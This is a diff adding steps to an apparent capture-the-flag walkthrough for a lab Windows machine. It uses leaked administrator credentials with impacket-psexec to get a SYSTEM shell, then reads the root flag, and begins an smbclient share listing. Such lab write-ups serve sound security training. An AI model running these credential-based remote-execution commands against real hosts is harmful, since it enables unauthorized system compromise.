@@ -18,6 +18,31 @@ It pointed out history that had cleartext credentials for the C$ SMB share.
 - administrator
 - MEGACORP_4dm1n!!
 
+These credentials work with the `impacket-psexec` tool to access the target directly.
+```
+┌──(kali㉿kali)-[~]
+└─$ impacket-psexec ARCHETYPE/administrator:'MEGACORP_4dm1n!!'@10.129.206.56
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.206.56.....
+[*] Found writable share ADMIN$
+[*] Uploading file YQPXHNdF.exe
+[*] Opening SVCManager on 10.129.206.56.....
+[*] Creating service vRUI on 10.129.206.56.....
+[*] Starting service vRUI.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2061]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+<REDACTED FOR WALKTHROUGH>
+
+```
+
+The commands below show accessing the machine using the smbclient tool.
 ```
 ┌──(kali㉿kali)-[~]
 └─$ smbclient -L //10.129.251.29/ -U administrator
